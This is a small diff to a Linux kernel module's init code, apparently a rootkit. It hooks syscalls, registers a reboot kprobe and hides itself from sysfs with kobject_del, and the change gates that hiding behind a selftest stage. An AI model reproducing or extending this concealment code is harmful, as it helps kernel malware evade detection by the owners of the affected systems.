@@ -360,7 +360,7 @@ static int __init mod_init(void)
 
     if (soryu_selftest == 10) { pr_info("stage10 ok\n"); return -EIO; }
     pr_info("step: kobject_del\n");
-    kobject_del(&THIS_MODULE->mkobj.kobj);
+    if (soryu_selftest < 13) { kobject_del(&THIS_MODULE->mkobj.kobj); }
 
     pr_info("module loaded, syscall_nr=%d reboot_fallback=%d\n",
             syscall_hook_nr(), g_reboot_kprobe_registered);
